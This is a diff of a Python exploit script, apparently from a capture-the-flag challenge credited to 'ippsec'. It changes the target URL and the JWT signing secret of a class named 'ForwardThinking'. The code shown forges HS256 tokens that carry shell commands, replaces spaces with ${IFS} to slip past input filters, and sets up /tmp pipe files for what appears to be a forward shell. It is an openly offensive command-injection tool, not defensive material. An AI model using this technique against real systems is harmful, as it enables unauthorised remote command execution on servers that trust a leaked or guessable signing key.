@@ -8,7 +8,7 @@ import base64
 class ForwardThinking(object):
 
     def __init__(self):
-        self.url = "http://172.16.1.22:3000"
+        self.url = "http://127.0.0.1:5555"
         session = random.randrange(1,65535)
         print(f"[*] Session Value: {session}")
         self.stdin = f'/tmp/input.{session}'
@@ -32,7 +32,7 @@ class ForwardThinking(object):
             return response
 
     def jwt_command(self, cmd):
-        secret = b"hope you enjoy this challenge -ippsec"
+        secret = b"random_key"
         cmd = cmd.replace(" ", "${IFS}")
         encoded_cmd = jwt.encode({"cmd":cmd}, key=secret, algorithm="HS256")
         return encoded_cmd
